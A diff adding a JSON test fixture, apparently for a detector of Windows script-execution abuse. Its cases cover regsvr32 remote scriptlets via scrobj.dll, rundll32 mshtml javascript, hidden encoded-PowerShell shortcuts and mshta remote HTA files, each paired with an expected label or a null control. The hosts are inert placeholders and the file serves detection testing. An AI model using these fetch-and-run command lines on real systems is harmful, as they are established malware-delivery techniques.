@@ -1,0 +1,293 @@
+[
+  {
+    "name": "regsvr32.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": "script_regsvr32_remote_scriptlet"
+  },
+  {
+    "name": "regsvr32_reordered.cmd",
+    "text": "\"C:\\Windows\\System32\\REGSVR32.EXE\" scrobj.dll /u /i:\"https://example.invalid/inert\"",
+    "expected": "script_regsvr32_remote_scriptlet"
+  },
+  {
+    "name": "regsvr32_utf16le.bin",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": "script_regsvr32_remote_scriptlet",
+    "encoding": "utf-16le"
+  },
+  {
+    "name": "regsvr32_utf16be.bin",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": "script_regsvr32_remote_scriptlet",
+    "encoding": "utf-16be"
+  },
+  {
+    "name": "regsvr32_entities.html",
+    "text": "regsvr32.exe /s /n /u&#32;/i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": "script_regsvr32_remote_scriptlet"
+  },
+  {
+    "name": "regsvr32.zip",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": "script_regsvr32_remote_scriptlet",
+    "container": "zip"
+  },
+  {
+    "name": "regsvr32_local.cmd",
+    "text": "regsvr32.exe /s /n /u /i:local.sct scrobj.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_registration.cmd",
+    "text": "regsvr32.exe /s example.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_no_dll.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_wrong_dll.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct example.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_dll_suffix.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll.txt",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_wrong_exe.cmd",
+    "text": "notregsvr32.exe /s /n /u /i:https://example.invalid/inert.sct scrobj.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_newline.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct\nscrobj.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_other_command.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct & echo scrobj.dll",
+    "expected": null
+  },
+  {
+    "name": "regsvr32_far.cmd",
+    "text": "regsvr32.exe /s /n /u /i:https://example.invalid/inert.sct                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    scrobj.dll",
+    "expected": null
+  },
+  {
+    "name": "rundll32.cmd",
+    "text": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": "script_rundll32_mshtml"
+  },
+  {
+    "name": "rundll32_utf16.bin",
+    "text": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": "script_rundll32_mshtml",
+    "encoding": "utf-16"
+  },
+  {
+    "name": "rundll32_spaces.cmd",
+    "text": "RUNDLL32 javascript:\"..\\MSHTML , RunHTMLApplication \";void(0)",
+    "expected": "script_rundll32_mshtml"
+  },
+  {
+    "name": "rundll32.gz",
+    "text": "rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": "script_rundll32_mshtml",
+    "container": "gzip"
+  },
+  {
+    "name": "rundll32_control_panel.cmd",
+    "text": "rundll32.exe shell32.dll,Control_RunDLL",
+    "expected": null
+  },
+  {
+    "name": "rundll32_no_protocol.cmd",
+    "text": "rundll32.exe \"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": null
+  },
+  {
+    "name": "rundll32_wrong_export.cmd",
+    "text": "rundll32.exe javascript:\"..\\mshtml,RunOtherApplication \";void(0)",
+    "expected": null
+  },
+  {
+    "name": "rundll32_wrong_exe.cmd",
+    "text": "notrundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": null
+  },
+  {
+    "name": "rundll32_separate_line.cmd",
+    "text": "rundll32.exe javascript:\n\"..\\mshtml,RunHTMLApplication \";void(0)",
+    "expected": null
+  },
+  {
+    "name": "powershell.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded"
+  },
+  {
+    "name": "powershell_ansi.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded",
+    "unicode": false
+  },
+  {
+    "name": "pwsh_quoted.lnk",
+    "target": "pwsh.exe",
+    "args": "-ep Bypass -enc \"VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==\"",
+    "expected": "shortcut_powershell_encoded"
+  },
+  {
+    "name": "powershell_local_base.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded",
+    "location": "local"
+  },
+  {
+    "name": "powershell_common_suffix.lnk",
+    "target": "powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded",
+    "location": "suffix"
+  },
+  {
+    "name": "powershell_zip.zip",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded",
+    "container": "zip"
+  },
+  {
+    "name": "powershell_renamed.bin",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": "shortcut_powershell_encoded"
+  },
+  {
+    "name": "powershell_no_hiding.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": null
+  },
+  {
+    "name": "powershell_no_encoding.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-WindowStyle Hidden -File backup.ps1",
+    "expected": null
+  },
+  {
+    "name": "powershell_literal.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-NoProfile -Command \"Write-Output hello\"",
+    "expected": null
+  },
+  {
+    "name": "powershell_wrong_target.lnk",
+    "target": "notpowershell.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": null
+  },
+  {
+    "name": "powershell_wrong_suffix.lnk",
+    "target": "powershell.exe.txt",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": null
+  },
+  {
+    "name": "powershell_description.lnk",
+    "target": "notepad.exe",
+    "args": "-WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": null,
+    "description": "powershell.exe"
+  },
+  {
+    "name": "powershell_short_encoding.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-w hidden -enc Zg==",
+    "expected": null
+  },
+  {
+    "name": "powershell_bad_encoding.lnk",
+    "target": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "args": "-w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AH!AIAAnAGkAbgBlAHIAdAAnAA==",
+    "expected": null
+  },
+  {
+    "name": "mshta.lnk",
+    "target": "C:\\Windows\\System32\\mshta.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": "shortcut_mshta_remote"
+  },
+  {
+    "name": "mshta_ansi.lnk",
+    "target": "mshta.exe",
+    "args": "\"HTTPS://example.invalid/inert.hta\"",
+    "expected": "shortcut_mshta_remote",
+    "unicode": false
+  },
+  {
+    "name": "mshta_local_base.lnk",
+    "target": "C:\\Windows\\System32\\mshta.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": "shortcut_mshta_remote",
+    "location": "local"
+  },
+  {
+    "name": "mshta_common_suffix.lnk",
+    "target": "mshta.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": "shortcut_mshta_remote",
+    "location": "suffix"
+  },
+  {
+    "name": "mshta_zip.zip",
+    "target": "mshta.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": "shortcut_mshta_remote",
+    "container": "zip"
+  },
+  {
+    "name": "mshta_local.lnk",
+    "target": "mshta.exe",
+    "args": "C:\\Tools\\inert.hta",
+    "expected": null
+  },
+  {
+    "name": "mshta_wrong_target.lnk",
+    "target": "notepad.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": null
+  },
+  {
+    "name": "mshta_wrong_suffix.lnk",
+    "target": "mshta.exe.txt",
+    "args": "https://example.invalid/inert.hta",
+    "expected": null
+  },
+  {
+    "name": "mshta_description.lnk",
+    "target": "notepad.exe",
+    "args": "https://example.invalid/inert.hta",
+    "expected": null,
+    "description": "mshta.exe"
+  },
+  {
+    "name": "mshta_missing_url.lnk",
+    "target": "mshta.exe",
+    "args": "",
+    "expected": null
+  },
+  {
+    "name": "mshta_data_url.lnk",
+    "target": "mshta.exe",
+    "args": "data:text/plain,inert",
+    "expected": null
+  }
+]
